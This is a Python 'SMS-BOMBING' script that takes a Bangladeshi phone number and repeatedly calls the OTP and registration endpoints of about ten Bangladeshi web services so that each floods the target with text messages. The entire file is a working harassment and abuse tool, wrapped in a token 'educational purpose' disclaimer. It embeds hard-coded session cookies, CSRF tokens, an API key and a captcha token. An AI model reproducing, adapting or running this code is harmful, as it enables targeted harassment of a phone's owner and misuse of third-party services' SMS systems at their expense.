import requests
import sys
import time
import os

os.system("clear")
time.sleep(2)
print("""\033[1;32m



  ___ __  __ ___     ___  ___  __  __ ___ ___ _  _  ___ 
 / __|  \\/  / __|___| _ )/ _ \\|  \\/  | _ |_ _| \\| |/ __|
 \\__ | |\\/| \\__ |___| _ | (_) | |\\/| | _ \\| || .` | (_ |
 |___|_|  |_|___/   |___/\\___/|_|  |_|___|___|_|\\_|\\___|
                                      

\t\t\033[1;33m⚠️ Warning!\n\033[1;31mThis tool is only made for Educational Purpose. Misuse of this tool can be trigger the Cyber System. We do not support any type of Hacking or Phishing and the developer will not responsible for any misuse of this tool. Stay in Ethic. ✅\033[0m"                                                                                                                                                   \033[1;36m
————————————————————————————————————————————————————————————————————————————————
\033[1;34mTools Author: \033[1;33mMohammad Rayhan Khan
\033[1;34mVersion: \033[1;33m1.0
\033[1;34mTool Name: \033[1;33mSMS-BOMBING
\033[1;34mGithub: \033[1;33mhttps://github.com/lucifer-fernandez/SMS-BOMB.git
\033[1;36m————————————————————————————————————————————————————————————————————————————————
""")




num = input("\033[1;36mEnter your Target Number:\033[0m ")
if len(num) == 11 and num.isdigit() and num.startswith('01'):
    pass
else:
    print("\033[1;31m❌ Invalid Number!\033[0m")
    sys.exit()


amount_input = input("\033[1;36mEnter your SMS amount between (1-100):\033[0m ")
if not amount_input.isdigit():
    print("\033[1;31m❌ Invalid input!\033[0m")
    sys.exit()

amount = int(amount_input)
if amount < 1 or amount > 100:
    print("\033[1;31m❌ Invalid amount! Must be between 1 and 100.\033[0m")
    sys.exit()

os.system("clear")

a = "\n\n\n\t\t\033[1;33m💣 Bombing Started...!\033[0m\n"
for i in a:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(0.09)
print("\n\t\033[1;34mPress Control+Z for stop Bombing.\033[0m\n\n\n")
time.sleep(3)

sent = 0

    
    

while sent < amount:
 
    # iqra-live
    a = requests.get(f'https://apibeta.iqra-live.com/api/v2/sent-otp/{num}')
    if a.status_code == 200:
        sent += 1
        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
        time.sleep(1)
    else:
        pass


    # bikroy.com
    b = requests.get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}')
    if b.status_code == 200:
        sent += 1
        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
        time.sleep(1)
    else:
        pass

                
    # e-courier
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Origin': 'https://ecourier.com.bd',
        'Referer': 'https://ecourier.com.bd/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params = {
        'mobile': num,
    }
    
    c = requests.get('https://backoffice.ecourier.com.bd/api/web/individual-send-otp', params=params, headers=headers)
    if c.status_code == 200:
        sent += 1
        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
        time.sleep(1)
    else:
        pass

        
    # quizbd
    cookies = {
        '_gcl_gs': '2.1.k5$i1754139607$u36406433',
        '_gcl_au': '1.1.1053490129.1754139612',
        '_ga': 'GA1.1.466660647.1754139613',
        '_tt_enable_cookie': '1',
        '_ttp': '01K1NDWPS08RH3HK16SGCV6Z4H_.tt.1',
        '_fbp': 'fb.1.1754139614479.845709771715957314',
        'ttcsid_COSTTJJC77U1Q2BAH980': '1754146481721::XjilHizjYwtDZqJQRnCN.2.1754146482284',
        'ttcsid_CPEM4I3C77UBKGA90VN0': '1754146481738::lJsEmhO1EvOc0xcThKjo.2.1754146482286',
        'ttcsid_CTR76TRC77U1GH2BI2V0': '1754146481746::dN_FtsdpMVyvBNdlsD9Y.2.1754146482288',
        '_ga_J177DW73V3': 'GS2.1.s1754146480$o2$g0$t1754146485$j55$l0$h0',
        '_gcl_aw': 'GCL.1754146488.EAIaIQobChMI2deH05bsjgMV6TZUCR2aOyhpEAEYASAAEgI-5vD_BwE',
        'XSRF-TOKEN': 'eyJpdiI6ImpBNElEVy81VWdOV2J6SnJmRk83cXc9PSIsInZhbHVlIjoiaEd0NmZCNDdXVkt3OE1XRS9EdDkyV1liYWo0SXRzSDRPUjVxcXl5MjV6SklBYnBvWUU5dU81TlpFUVViN0VSRVh4R0ZDU2p1aDRFZjhublhNMVc3cWJLWmdldU9ML2xCa295aEFwU1pUaW9ROFc2b0s4bi9GSlFseHJsancwWnUiLCJtYWMiOiI2MDA1YTcwNWFmNTk2YTc4MDUyZWM4YWY4ZTgzYTJmM2YwMmJjMzcxM2EzMWU3MDZhODFmODU3MWNkMzMwZDMwIiwidGFnIjoiIn0%3D',
        'quizbd_session': 'eyJpdiI6InozNGRDem9QSkp0Q2N0RmN1OWpNS2c9PSIsInZhbHVlIjoiMVpNdllmTDVyMGZ0S2NLRzVtSGIwcHRIMnVZUU9kTDVnb0FUaE9hd3JlbFdOMGwvYnFxQkVCOGJoLzRkbWVWcXhpZTY5MXVjMk85VllWcE9Ib29sMzBONjVPajhUWXZNZEJtT3hwQ2VwS1lUNjlrRnBGT0ljRmd4aDUzeGZZMEYiLCJtYWMiOiJlM2M2MTE4NjE4Mzk4YWYwNjYwZTllNzg4YTQ4ODg5ZDE5OWYxNDBjMWJmNGEyNDRmZjY1YTY4NDJlZjE5NGIyIiwidGFnIjoiIn0%3D',
        'ttcsid': '1754146481727::Jugp3IwwV0l78ZAKMrVb.2.1754146501483',
        'ttcsid_CPK02KJC77U57258L9A0': '1754146487606::2ePqBt0LuVMUVkZim0Lf.2.1754146501750',
        'ttcsid_CR7CT4RC77U5L7EOR4FG': '1754146487613::5Mz94VWbRcYyp-k5VzIN.2.1754146501751',
        '_ga_4CKNNTBZW6': 'GS2.1.s1754146487$o2$g0$t1754146502$j45$l0$h0',
    }
    
    headers = {
        'authority': 'pay.quizbd.app',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
    
        'origin': 'https://pay.quizbd.app',
        'referer': 'https://pay.quizbd.app/buy-pack/1025?gad_source=5&gad_campaignid=22843081087&gclid=EAIaIQobChMI2deH05bsjgMV6TZUCR2aOyhpEAEYASAAEgI-5vD_BwE',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        '_token': '4kyvvDVDl6zsTWiuKREy4orb6OyofyV7RHF4m7ik',
        'bundleId': '1025',
        'campaign': '',
        'userNumber': num,
    }
    
    d = requests.post('https://pay.quizbd.app/send-otp', cookies=cookies, headers=headers, data=data)
    if d.status_code == 200:
        sent += 1
        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
        time.sleep(1)
    else:
        pass

                
    # quizgiri    
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-type': 'application/json; charset=utf-8',
        'Origin': 'https://app.quizgiri.com.bd',
        'Referer': 'https://app.quizgiri.com.bd/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'x-api-key': 'gYsiNSVBDuCt8yMUXpF06iQ1eDrMGv6G',
    }
    
    json_data = {
        'phone': num,
        'country_code': '+88',
        'fcm_token': None,
    }
    
    e = requests.post('https://developer.quizgiri.xyz/api/v2.0/send-otp', headers=headers, json=json_data)
    if e.status_code == 200:
        sent += 1
        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
        time.sleep(1)
    else:
        pass
    
            
    # redx
    cookies = {
        '_ga': 'GA1.1.1007807516.1754153780',
        '_fbp': 'fb.2.1754153780093.834494875177130484',
        '_gcl_au': '1.1.1444896708.1754153781',
        '_ga_ZTN98XM7BX': 'GS2.1.s1754153781$o1$g1$t1754153826$j15$l0$h0',
        '_ga_DVN5RVT5NY': 'GS2.1.s1754153779$o1$g1$t1754153829$j10$l0$h0',
    }
    
    headers = {
        'authority': 'api.redx.com.bd',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
    
        'origin': 'https://redx.com.bd',
        'referer': 'https://redx.com.bd/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    json_data = {
        'phoneNumber': num,
    }
    
    f = requests.post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    if f.status_code == 200:
        sent += 1
        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
        time.sleep(1)
    else:
        pass

        
    # hoichoi
    if not num.startswith("+88"):
        num = "+88" + num
    
    headers = {
        'authority': 'prod-api.hoichoi.dev',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.hoichoi.tv',
        'referer': 'https://www.hoichoi.tv/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    json_data = {
        'phoneNumber': num,
    }
    
    g = requests.post('https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code/resend', headers=headers, json=json_data)
    if g.status_code == 200:
        sent += 1
        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
        time.sleep(1)
    else:
        pass

                
    # jotno
    cookies = {
        'AWSALB': 'LXD99btGj0/Y8fb2bl2yfIgbirrJTcuxqwj6jW7G3nkcvY3ODRtuB7iig6opXP/bx1cjMWHF2g+h/AHTUNo2fMjWDQ+8Shqgm4G2hPk4yu+oYgJT5wGrAmyoZopjMiVt4qIrhk41Ws2Ru3VvVxfcesOi8isYWcPz/EcO1XKc27uUXKy4v36AZfzBCpJSVQ==',
        'AWSALBCORS': 'LXD99btGj0/Y8fb2bl2yfIgbirrJTcuxqwj6jW7G3nkcvY3ODRtuB7iig6opXP/bx1cjMWHF2g+h/AHTUNo2fMjWDQ+8Shqgm4G2hPk4yu+oYgJT5wGrAmyoZopjMiVt4qIrhk41Ws2Ru3VvVxfcesOi8isYWcPz/EcO1XKc27uUXKy4v36AZfzBCpJSVQ==',
    }
    
    headers = {
        'authority': 'gw.jotno.net',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
    
        'origin': 'https://www.jotno.net',
        'referer': 'https://www.jotno.net/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-request-source': 'web',
    }
    
    json_data = {
        'userType': 'CONSUMER',
        'username': num,
        'apiKey': '03AFcWeA7Vom9T6jToVPVSUp5LUyT5bDVd69tCAkRci5v3XU5q976aCaOXQn9M4LnhlLl6bu4oJJ-VgkVZIyYrdA3UFBiPikH-QGX7TUwmLgOTdB8v82vZCZ2LcVVFgpV7wIaShN6ISYKJbcb5IFIbcohjKln1nQI1dq9rQ_CzWmh8qrfWkJ3ugBeaLIwVjNlNwleYh6PpE2UY9Tj-b80sQgVVRYlfkLGXRi1mKe3GCk-0K-xgwf3Ob6_M3OhC3phIeKrsOjTJJWtB1MEo7eOiVNJAjccJ80aIhZCCavGZRZzqik1i59_J1u_9b6kAO9XFGo6ch0koAa5nXgbJqWwxoxbL_q1-HRkDtFBEWRSymekee6vYOXlUt_NGRSRQQRo_0LNY1J_02N2_ur2nBzHmgnVJImUs-fKrfLJ6g4aMYtpjK1AFIxzU1KwZiuNMh4C2Mb5R3ORE_1eDMfHFTPLEdUglK34aC8_ggpvulvwigJiVZD-brIyESd_aFn9z1K79PTbHhWZrQKuDnhKNWl1qfb7Ns9HDXoT_7R1YHl6syEjpQ758nEWr8LQ8kmsfKm-xGVRAO7QHLnm5EpUXzDecXF7I6WZsax5qLemLWggwje4oztakL52nKWhyDRXbmWWfDWANXC67O5nq0EyJ0ssuk_Mo14qI4ESqoHe0ieJIJIbYl-wkheERo6jccvYW_DhM8ZfMjVPSb3KI8Ui5TczbuRme5SAeqSJQ5SPPsyJz2gJhYXXQUasrglQLC6qQHcLmQc1ZAdeGl_VSm-lPHmt-L9cDj6A4UhPdqOj1Xa0Pv5yQdJeaFHdkm5EtrfXNdxquWdbfiH8fjrD6-A8U5mEzFVJLthndQFKwti5ic38rKKpr9DlVhAFG2gzQjHzya6FmfvbdjqzQpF_yDSsQBzej1gMbNjoH2vXK1oDwCtJBaSzG5gNA_Y6Pjsh67Fp0bc5RfmWbhsbN_qXFjfuECGVqRokNnIMB-2gQm-Ej_HsIRsknswuFUG5tjezgFSoIVTh03HQ1f-udy8qjIRjrDdN_cA6z8hCxg580XqAe3AmNMgb_nNQBukK3qCZVLPm4EMMavfjZ9c4EC4SyasjLo3EJvqcOrm-NGukrg8FDFpvcMuwNrl67eP57KNfDMr1YRIKqDz_vN5CtpLldfwaO4D3hJUMa7o3ADJh_vtT-gyEtBAq-mAgEn7nj8dE47DGt8DIl5cF_7b2IUqbFywq6MMXLk1GPTZvbyqKxA_F4LCYCgNWRbsc6FU9ijq3mZmDMaJExEJud2kaDQGqQWyI39NjLZ6DlT7BViFo0306h2puCmE30g4xcL6W5avZkdgTaBUgtqPhyt6kGpjtJoL7CVeGvI0t8Ngv70zv_IUDPJGosbgEkAdkcQNOkCH4m2Oa47cg3DjYNI3tZ8W2sMZSpv-IRWuymugLSHjm2f2PDGSYqJwsV4eBUxhT7MI63A4fvrQrXSpPAfc0nciighyUU2QdeV6BzqODSswBO4Ad_QdYb_KrTpd7KR44ebBH4nSybHMtl38Q81EpF--bLhh0P9YmTLKEPROkCWhU2CWIw-BPZJMXgcVCsWHMRuJbZHxQnwYM0QWYExRvmQ-w9hkNl26HE3OfIWkMBASyPAMUD1GG-zQIib0PXpRGOZ_WfWewOtG4zzkfnwtvYyLXS16XjnmMiU2RZTsK_c9i6_S1fpGkf6fgRrZaBf_OEY1bIH_yu0EMDrkVZYIV_39JijFUj4VMMWlUgEnt9-KZ5_gSGrpCJoyeJlaMTnKL2VVn9jCZ-TcH_ZbLSRcS5jJGZXH7SR16evt88xLQHbD8FbsNxgJpCrWCBxuiuZMYY18tKnY0PROJjroxRz5BS7mfA05Rt3lVH6CBXFeXfQEtrsRiRBTx4tp4df5TxIq07ZjXx-ukkLFrTp0rXwVZ9uwrceh0PKhP--l2bx43broUvSJLfG5O4-Jaw9IFiE15ESVmEusbuUml_Y0K-26jF3xSGpdXFESf8LPTnwb9Zl8Gw_g8nthd9e7f6fZSgobA6dh-cwe1MT7O0ITCG29Er1_StBLoaQX5gfDP3ujLR36uS7DjfD14RSOMOr1DB6OulNt4q4ufsbmgBaHLQ5PaNlM6qVCbKfipbj2g67taoEXVTtMwgHJv_OlJ3owQjHU5KEmHvOSvC8j9SQU6hpMrlIQR0',
    }
    
    h = requests.post('https://gw.jotno.net/auth/login/token', cookies=cookies, headers=headers, json=json_data)
    if h.status_code == 200:
        sent += 1
        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
        time.sleep(1)
    else:
        pass

                  
    # rokomari
    if not num.startswith("+88"):
        num = "+88" + num
        cookies = {
            'JSESSIONID': 'd1328198-e00c-4fc9-b091-2479d62973d4',
            'userActTraSerBrowId': 'c146df39-5590-43fe-b65b-756906cc412b',
            'userActTraSerSessId': '75411431-a07b-48d0-beb1-2ab57e6acf6b',
            '_gcl_au': '1.1.672599153.1754205960',
            '_gid': 'GA1.2.313656100.1754205962',
            '_gat': '1',
            '_gat_UA-28456258-1': '1',
            '_fbp': 'fb.1.1754205963238.190392695153971306',
            '_clck': 'ubuyem%7C2%7Cfy5%7C0%7C2041',
            'nt_req_con_indx': '["nt_all_index"]',
            'nt_pop_shown': '["nt_all_pop_shown"]',
            'cf_clearance': 'Dm6S9bVHLzI1GBXAMK08sk5hYnUym43cnVMW07BvVhk-1754205970-1.2.1.1-xFbKVPgeUOz.iNeYPJ9wv_OwcNyrGwLvUmFzJZMWN.fD5yeSXSylEurLgtkERTHarr0yRcAMcKFEI464vXiBF2c_INEOndcxiBLLW4hwAW.MMA6yp4.I4_iksm_idA4Pv9FumSQ9kQL3tGYXskTB49KreZprSdMT1UBdI8ihgDtdcp.WI.fJuOBjXySrW2MjSehsztFlhB0DNS_xTzmaveNzSeOB788khxiTJd_5Lcs',
            'sururl': 'aHR0cHM6Ly93d3cucm9rb21hcmkuY29tL2xvZ2lu',
            '_ga': 'GA1.2.2047015479.1754205962',
            '_ga_N8S2Z6QJVP': 'GS2.1.s1754205961$o1$g1$t1754205978$j43$l0$h0',
            '_clsk': '13xxp1p%7C1754205979228%7C2%7C1%7Ci.clarity.ms%2Fcollect',
        }
        
    headers = {
            'authority': 'www.rokomari.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
        
            'origin': 'https://www.rokomari.com',
            'referer': 'https://www.rokomari.com/login',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
    params = {
            'emailOrPhone': num,
            'countryCode': 'BD',
        }
        
    i = requests.post('https://www.rokomari.com/otp/send', params=params, cookies=cookies, headers=headers)
    if i.status_code == 200:
        sent += 1
        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
        time.sleep(1)
    else:        
        pass

                
    # ajkerdeal
    headers = {
        'authority': 'api.ajkerdeal.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://corporate.ajkerdeal.com',
        'referer': 'https://corporate.ajkerdeal.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    json_data = {
        'MobileOrEmail': num,
        'Type': 2,
        'CustomerId': None
    }
    
    j = requests.post('https://api.ajkerdeal.com/recover/retrivepassword/appcustomersignup', headers=headers, json=json_data)
    if j.status_code == 200:
        sent += 1
        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
        time.sleep(1)
    else:        
        pass        
        
                
    
b = "\n\n\n\t\t\033[1;33m🔥 SMS Bombing Successful.\033[0m\n\n\n"
for i in b:
    sys.stdout.write(i)
    sys.stdout.flush() 
    time.sleep(0.09)
    
    
    
#print(response.status_code)
#print(response.text)                                                         
